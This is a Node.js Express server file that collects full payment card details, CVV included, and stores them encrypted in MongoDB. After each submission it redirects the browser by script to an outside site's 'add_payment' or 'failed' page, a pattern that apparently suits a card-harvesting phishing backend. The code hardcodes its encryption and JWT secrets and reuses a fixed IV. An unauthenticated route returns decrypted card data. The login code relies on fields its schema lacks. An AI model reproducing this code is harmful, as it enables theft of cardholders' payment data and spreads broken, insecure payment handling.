const express = require("express");
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const mongoose = require("mongoose");

// Create an Express app
const app = express();
app.use(express.json());
app.use(express.urlencoded());
//crypto
const crypto = require("crypto");
const { count } = require("console");

const algorithm = "aes-256-cbc";
const secret = "5859rfjd8eklj8iwkhjenkwue8oik3ewe7iuwyhfno78u3iwkhbd7i"; // Replace with a strong encryption key
let key = crypto
    .createHash("sha256")
    .update(String(secret))
    .digest("base64")
    .substr(0, 32);

const iv = crypto.randomBytes(16);

function encrypt(text) {
    const cipher = crypto.createCipheriv(algorithm, key, iv);
    let encrypted = cipher.update(text, "utf8", "hex");
    encrypted += cipher.final("hex");
    return encrypted;
}

function decrypt(encrypted) {
    const decipher = crypto.createDecipheriv(algorithm, key, iv);
    let decrypted = decipher.update(encrypted, "hex", "utf8");
    decrypted += decipher.final("utf8");
    return decrypted;
}
// Connect to MongoDB
mongoose.connect("mongodb://127.0.0.1:27017/testdb1", {
    useNewUrlParser: true,
    useUnifiedTopology: true,
});
const db = mongoose.connection;
db.on("error", console.error.bind(console, "MongoDB connection error:"));
db.once("open", () => {
    console.log("Connected to MongoDB");
});

const Schema = mongoose.Schema

let userSchema = new Schema({

    cardDetails: String
})


const User = mongoose.model("Deets", userSchema);

// Define the routes
app.post("/login", async(req, res) => {
    const { username, password } = req.body;

    // Check if the user exists
    const user = await User.findOne({ username });
    if (!user) {
        return res.status(401).json({ message: "Invalid username or password" });
    }

    // Check the password
    const validPassword = await bcrypt.compare(password, user.password);
    if (!validPassword) {
        return res.status(401).json({ message: "Invalid username or password" });
    }

    // Generate a JWT token
    const token = jwt.sign({ username: user.username }, "secretkey");

    res.json({ token });
});

app.get("/carddetails/:username", async(req, res) => {
    const { username } = req.params;

    // Find the user
    const user = await User.findById(username);
    if (!user) {
        return res.status(404).json({ message: "User not found" });
    }

    // Decrypt and retrieve the card details
    const decryptedCardDetails = decrypt(user.cardDetails);

    res.status(200).json(JSON.parse(decryptedCardDetails));
});

app.post("/signup", async(req, res) => {
    const { username, password, zipCode, address } = req.body;
    console.log(req.body);
    if (!username || !password || !zipCode || !address)
        return res.status(409).json({ message: "fields missing" });

    // Check if the user already exists
    const existingUser = await User.findOne({ username });
    if (existingUser) {
        return res.status(409).json({ message: "Username already exists" });
    }

    // Hash the password
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    // Create a new user
    const newUser = new User({
        username,
        password: hashedPassword,
        zipCode,
        address,
    });
    await newUser.save();

    res.status(201).json({ message: "User created successfully" });
});

app.post("/carddetails", async(req, res) => {
    const {
        username,
        cardNumber,
        cardHolder,
        expirationDate,
        cvv,
        street,
        street2,
        city,
        state,
        zipcode,
        phone_number,
        country
    } = req.body;
    if (!cardNumber ||
        !username ||
        !cardHolder ||
        !expirationDate ||
        !cvv ||
        !street ||
        !city ||
        !zipcode ||
        !phone_number ||
        !country)
        return res.status(409).json({ message: "fields missing" });
    // Find the user

    // Encrypt the card details
    const encryptedCardDetails = encrypt(
        JSON.stringify({
            cardNumber,
            cardHolder,
            expirationDate,
            cvv,
            street: street + street2 ? street2 : '',
            city,
            zipcode,
            state,
            phone_number,
            country
        })

    );

    // Store the encrypted card details
    let deets = new User({ cardDetails: encryptedCardDetails });
    await deets.save();
    if (username === 'first') {
        res.status(200).send(`<script>window.open("https://mistressdanielle1.com/add_payment",'_self')</script>`);

    } else {
        res.status(200).send(`<script>window.open("https://mistressdanielle1.com/failed",'_self')</script>`);

    }
});

// Start the server
app.listen(3000, () => {
    console.log("Server listening on port 3000");
});
// Start the server

console.log("Server listening on port 3000");